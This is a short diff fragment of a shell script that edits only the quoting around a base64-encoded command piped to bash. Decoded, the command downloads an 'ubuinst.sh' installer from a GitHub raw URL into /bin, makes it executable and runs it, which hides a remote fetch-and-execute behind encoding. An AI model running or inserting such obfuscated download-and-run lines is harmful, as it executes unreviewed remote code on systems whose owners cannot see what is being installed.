@@ -2,6 +2,5 @@
 echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
 bS9hZ3JhbmRlZmFtaWxpYXNzaC9wd2ViL3BhaW5lbC9pbnN0YWxsL3VidWluc3Quc2ggJiYgY2ht
 b2QgK3ggdWJ1aW5zdC5zaCAmJiBkb3MydW5peCB1YnVpbnN0LnNoID4gL2Rldi9udWxsIDI+JjEK
-Y2QgfHwgZXhpdA==
-' | base64 -d | bash
+Y2QgfHwgZXhpdA==' | base64 -d | bash
 /bin/ubuinst.sh
